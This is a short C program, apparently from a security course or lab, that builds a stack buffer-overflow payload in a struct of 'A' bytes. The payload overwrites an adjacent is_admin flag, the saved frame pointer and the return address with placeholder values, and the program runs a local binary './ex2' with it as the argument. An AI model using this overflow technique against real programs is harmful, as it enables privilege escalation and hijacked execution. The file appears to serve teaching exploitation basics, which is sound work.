#include <unistd.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <stdio.h>

struct {
  uint8_t buf[32];
  uint8_t padding[12];
  int32_t is_admin;
  uint64_t saved_rbp;

  // while the return address is 64 bit, we only care about overwriting the
  // lower 32
  uint32_t return_addr;
  char null;
} payload;

int main (int argc, char *argv[]) {

  printf("sizeof(payload) = %ld\n", sizeof(payload));

  // fill payload with A's
  memset(&payload, 'A', sizeof(payload));

  // null terminate the string
  payload.null = 0;

  payload.saved_rbp = 0x4242424242424242;
  payload.return_addr = 0x41414141;

  uint8_t *foo = (uint8_t*)&payload;
  for (int i = 0; i < sizeof(payload); i++)
    printf("%d\n", foo[i]);

  char *const exec_argv[] = {
    "./ex2",
    (char*)&payload,
    NULL
  };

  execv(exec_argv[0], exec_argv);

  return EXIT_FAILURE;
}
